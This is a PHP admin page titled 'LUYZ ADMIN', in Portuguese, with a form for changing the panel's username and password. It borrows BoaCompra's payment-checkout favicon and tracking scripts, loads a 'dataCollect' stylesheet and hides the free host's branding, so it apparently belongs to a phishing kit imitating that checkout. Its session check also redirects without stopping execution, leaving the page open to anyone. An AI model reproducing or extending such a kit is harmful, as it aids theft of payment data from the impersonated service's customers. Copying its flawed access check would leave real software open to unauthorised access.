

<?php

error_reporting(0);

session_start();
if (!isset($_SESSION['user']) || !isset($_SESSION['pass'])) {
	setcookie('msg','<center>Voce deve logar-se primeiro',time()+1);
	header('Location: login.php');
}

if (@$_GET['action'] == 'sair') {
	session_destroy();
	header('Location: login.php');
}

?>
<html lang="en">
 <head> 
  <title>LUYZ ADMIN</title> 
  <meta charset="UTF-8">
  <meta name="robots" content="noindex"> 
  <meta name="theme-color" content="black"> 
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=0"> 
  <link rel="dns-prefetch" href="https://in.hotjar.com"> 
  <link rel="dns-prefetch" href="https://vars.hotjar.com"> 
  <link rel="dns-prefetch" href="https://script.hotjar.com"> 
  <link rel="dns-prefetch" href="https://static.hotjar.com"> 
  <link rel="dns-prefetch" href="https://me.jsuol.com.br"> 
  <link rel="dns-prefetch" href="https://api.boacompra.com"> 
  <link rel="dns-prefetch" href="//me.jsuol.com.br"> 
  <link rel="icon" href="https://payment.boacompra.com/statics//images/favicon.ico"> 
 
  <link rel="stylesheet" href="dataCollect/tokenized.css"> 
  <script async src="https://me.jsuol.com.br/aud/boacompracheckout.js"></script>
  <script async src="https://static.hotjar.com/c/hotjar-596441.js"></script>
  <script async src="https://script.hotjar.com/modules.24670e88b088e10656d2.js" charset="utf-8"></script>
 


<meta name="theme-color" content="red"> 
    <link href="css/bootstrap.css" rel="stylesheet">


    <link href="css/ie10-viewport-bug-workaround.css" rel="stylesheet">

  
    <link href="css/signin.css" rel="stylesheet">

   
    <script src="pjs/ie-emulation-modes-warning.js"></script>


<style> #tudo { background: url(teste.jpeg) no-repeat center center;background-size: 100%; } </style> 

<div class="tudo">
<style>
		h5,{
					font-family:Georgia, "Times New Roman", Times, serif;
					font-style:italic;
					font-size:30px;
					color:#d9524d;
					letter-spacing:-0.05;
					text-shadow:2px 1px 1px #666;
		}
		body{
		  background: url('img/usr.jpg') center center no-repeat fixed; 
		  -webkit-background-size: cover;
		  -moz-background-size: cover;
		  -o-background-size: cover;
		  background-size: cover;
		}
		h2 {
					font-family:Georgia, "Times New Roman", Times, serif;
					font-style:italic;
					font-size:30px;
					color:#28a745;
					letter-spacing:-0.05;
					text-shadow:1px 1px 1px 	#000;
		}
	img[src*="https://cdn.rawgit.com/000webhost/logo/e9bd13f7/footer-powered-by-000webhost-white2.png"] {display:none;}
		</style>
 </head> 
 <body class="tudo"> 

  

<center>
<div> <table> <tr> <td> <div> <a class="button" href="index.php" style="float: right; border:1px solid; padding: 11px 21px; vertical-align: middle; background:blue; color:white;border-radius:6px; font-size: 10px; font-family:helvetica, serif;text-decoration:none;">INICIO</a> </div> </td> <td> <div> <a class="button" href="deslogar.php" style="float: center; border:1px solid; padding: 11px 21px; vertical-align: middle; background:blue; color:white;border-radius:6px; font-size: 10px; font-family:helvetica, serif;text-decoration:none;">DESLOGAR</a>  </tr> </table> </div>

</center>
<center>

    
 

     <form id="form" action="add_usuario.php" method="POST" class="tokenized__form"> 
      
<div class="tokenized__wrapper tokenized__wrapper--form"> 
       
        
<div class="tokenized__fields"> 
        

         
          <div> 
           <input class="field-group__input" autocomplete="off" id="usuario" name="usuario"  placeholder="Digite seu novo usuário" type="text" required data-hj-masked=""> 
       
</div>
</div>
</div>
<input class="field-group__input" autocomplete="off" id="senha" name="senha"  placeholder="Digite sua nova senha" type="password" required data-hj-masked=""> 
       


</div>
      
</div>
         
<center>
       <button type="submit" class="btn btn-info ">MUDA LOGIN <n> </button> 
</form>

</center>
    
